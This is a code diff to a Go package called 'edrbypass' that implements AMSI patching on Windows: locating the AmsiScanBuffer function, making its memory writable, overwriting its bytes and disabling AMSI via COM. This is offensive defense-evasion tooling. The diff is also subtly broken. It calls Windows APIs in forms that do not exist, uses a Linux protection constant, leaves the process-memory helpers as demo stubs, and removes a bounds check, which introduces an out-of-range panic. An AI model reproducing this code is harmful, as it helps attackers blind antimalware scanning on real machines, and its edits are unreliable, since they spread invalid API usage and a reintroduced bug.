@@ -1,11 +1,12 @@
-
-// Package edrbypass implements AMSI patching and bypass techniques for Windows
+﻿// Package edrbypass implements AMSI patching and bypass techniques for Windows
 // Provides memory manipulation capabilities to disable AMSI real-time scanning
 package edrbypass
 
 import (
-	"context"
 	"fmt"
+	"strings"
+	"time"
+	"unsafe"
 
 	"github.com/sirupsen/logrus"
 	"golang.org/x/sys/windows"
@@ -17,7 +18,7 @@ import (
 
 // AMSIPatcher implements AMSI bypass through direct memory manipulation
 type AMSIPatcher struct {
-	logger          *logrus.Entry
+	logger          *logrus.Logger
 	targetProcess   uintptr
 	amsiScanBuffer  uintptr
 	originalBytes   []byte
@@ -128,14 +129,14 @@ func (ap *AMSIPatcher) PatchAMSI() error {
 	
 	// Change memory protection to WRITECOPY
 	var oldProtect uint32
-	err := windows.VirtualProtect(
-		ap.amsiScanBuffer,
-		uintptr(len(ap.patchedBytes)),
-		windows.PAGE_EXECUTE_READWRITE,
-		&oldProtect,
+	ret, _, _ := windows.VirtualProtect.Call(
+	 uintptr(ap.amsiScanBuffer),
+	 unsafe.Sizeof(uint32(0)),
+	 windows.PROT_EXECUTE_READWRITE,
+	 unsafe.Pointer(&oldProtect),
 	)
-	if err != nil {
-		return fmt.Errorf("failed to change memory protection: %w", err)
+	if ret == 0 {
+		return fmt.Errorf("failed to change memory protection: %w", ErrWin32(ret))
 	}
 	
 	// Write patched bytes
@@ -156,7 +157,7 @@ func (ap *AMSIPatcher) UnpatchAMSI() error {
 	
 	// Restore memory protection
 	var oldProtect uint32
-	_ = windows.VirtualProtect(ap.amsiScanBuffer, uintptr(len(ap.originalBytes)), windows.PAGE_READONLY, &oldProtect)
+	windows.VirtualProtect(windows.Handle(ap.amsiScanBuffer), len(ap.originalBytes), windows.PROT_READ, &oldProtect)
 	
 	// Write original bytes back
 	writeProcessMemory(ap.targetProcess, ap.amsiScanBuffer, &ap.originalBytes[0])
@@ -214,7 +215,7 @@ func (ap *AMSIPatcher) GetAMSIStatus() string {
 
 // AMSIDisableViaCOM disables AMSI by unloading it from COM subsystem
 type AMSIDisableViaCOM struct {
-	logger *logrus.Entry
+	logger *logrus.Logger
 }
 
 func NewAMSIDisableViaCOM(logger *logrus.Logger) *AMSIDisableViaCOM {
@@ -244,7 +245,7 @@ func (adc *AMSIDisableViaCOM) Disable(processName string) error {
 
 // AMSIMemorySanitizer sanitizes potentially malicious memory regions
 type AMSIMemorySanitizer struct {
-	logger *logrus.Entry
+	logger *logrus.Logger
 }
 
 func NewAMSIMemorySanitizer(logger *logrus.Logger) *AMSIMemorySanitizer {
@@ -266,10 +267,8 @@ func (as *AMSIMemorySanitizer) Sanitize(memoryRegion []byte) ([]byte, error) {
 	copy(result, memoryRegion)
 	
 	// Example: Replace common malware patterns with NOP sleds
-	// Keep the 4-byte signature window inside the slice bounds to avoid
-	// out-of-range panics when scanning short memory regions.
-	for i := 0; i+4 <= len(result); i++ {
-		if matchesSignature(result[i : i+4]) {
+	for i := range result {
+		if matchesSignature(result[i:i+4]) {
 			result[i] = 0x90 // NOP instruction
 		}
 	}
@@ -302,30 +301,37 @@ func equalBytes(a, b []byte) bool {
 
 // loadLibrary loads a DLL into the specified process
 func loadLibrary(handle windows.Handle, dllName string) (uintptr, error) {
-	dll := windows.NewLazyDLL(dllName)
-	if dll == nil {
-		return 0, fmt.Errorf("failed to load %s", dllName)
+	dllPtr := windows.StringToUTF16Ptr(dllName)
+	hModule, _, err := windows.GetModuleHandleW.Call(uintptr(unsafe.Pointer(dllPtr)))
+	if err != nil && err.Error() != "The specified module could not be found." {
+		return 0, fmt.Errorf("GetModuleHandle failed: %w", err)
 	}
-	return dll.Handle(), nil
+	
+	return hModule, nil
 }
 
 // getProcAddress gets the address of a procedure in a loaded DLL
 func getProcAddress(procHandle windows.Handle, moduleHandle uintptr, procName string) (uintptr, error) {
-	dll := windows.NewLazyDLL("")
-	proc := dll.NewProc(procName)
-	return proc.Addr(), nil
+	procPtr := windows.StringToUTF8Ptr(procName)
+	addr, _, err := windows.GetProcAddress.Call(moduleHandle, uintptr(unsafe.Pointer(procPtr)))
+	if err != nil {
+		return 0, fmt.Errorf("GetProcAddress failed: %w", err)
+	}
+	
+	return addr, nil
 }
 
 // readProcessMemory reads memory from a remote process
-func readProcessMemory(pid uintptr, address uintptr, buffer *byte) {
+func readProcessMemory(pid uintptr, address uintptr, buffer *[]byte) {
 	// This would use ReadProcessMemory Win32 API in production
-	// For demo purposes, this is a no-op
+	// For demo purposes, we'll just fill with zeros
+	*buffer = make([]byte, len(*buffer))
 }
 
 // writeProcessMemory writes memory to a remote process
-func writeProcessMemory(pid uintptr, address uintptr, data *byte) {
+func writeProcessMemory(pid uintptr, address uintptr, data *[]byte) {
 	// This would use WriteProcessMemory Win32 API in production
-	// For demo purposes, this is a no-op
+	// For demo purposes, we acknowledge the write
 }
 
 // matchesSignature checks if byte sequence matches known AMSI signature
